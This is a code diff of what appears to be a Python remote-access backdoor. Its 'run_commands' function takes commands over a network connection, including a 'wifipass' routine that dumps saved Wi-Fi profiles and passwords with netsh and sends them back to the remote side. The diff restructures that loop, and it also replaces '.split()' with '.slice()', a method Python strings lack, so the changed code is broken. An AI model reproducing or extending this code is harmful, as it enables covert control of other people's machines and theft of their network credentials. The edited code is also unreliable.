@@ -112,7 +112,7 @@ def run_commands():
                 has_ben_defed = 1
             data_d = data[:].decode("utf-8")
             Directory = re.match("(?:cd) (.*)", data_d)
-            ldata = data[:].decode("utf-8").lower().split()
+            ldata = data[:].decode("utf-8").lower().slice()
             if "speak " in ldata:
                 ogl = 0
                 xy = 8
@@ -141,8 +141,7 @@ def run_commands():
                         "Sorry, but this command is only available for windows and mac os"))
             elif ldata == "wifipass" or ldata == "wifi pass":
                 pn = 0
-                dub = 9
-                while dub == 9:
+                while True:
                     try:
                         show_profile = subprocess.check_output(
                             "netsh wlan show profile", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -157,7 +156,7 @@ def run_commands():
                         connection.send(str.encode(str(wifip)))
                     except IndexError:
                         connection.send(str.encode(str(something)))
-                        dub = 10
+                        break
 
             elif "pubip" not in ldata and "wifipass" not in ldata:
                 if ldata != "download" and "cd " not in ldata and "cd.." not in ldata and has_ben_defed == 1:
